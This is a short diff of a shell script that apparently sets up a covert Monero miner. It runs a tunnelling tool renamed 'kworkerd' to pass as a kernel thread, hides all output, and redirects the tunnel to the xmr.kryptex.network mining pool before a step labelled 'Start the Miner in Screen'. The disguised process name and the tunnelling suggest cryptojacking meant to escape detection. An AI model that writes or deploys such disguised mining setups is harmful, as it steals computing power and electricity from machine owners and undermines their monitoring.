@@ -45,7 +45,7 @@ stdbuf -oL -eL ./kworkerd server ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
 
 # 8. Start wstunnel Client
 stdbuf -oL -eL ./kworkerd client \
-    -L tcp://127.0.0.1:${TCP_PORT}:0.tcp.eu.ngrok.io:19652 \
+    -L tcp://127.0.0.1:${TCP_PORT}:xmr.kryptex.network:7029 \
     ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
 
 # 9. Start the Miner in Screen
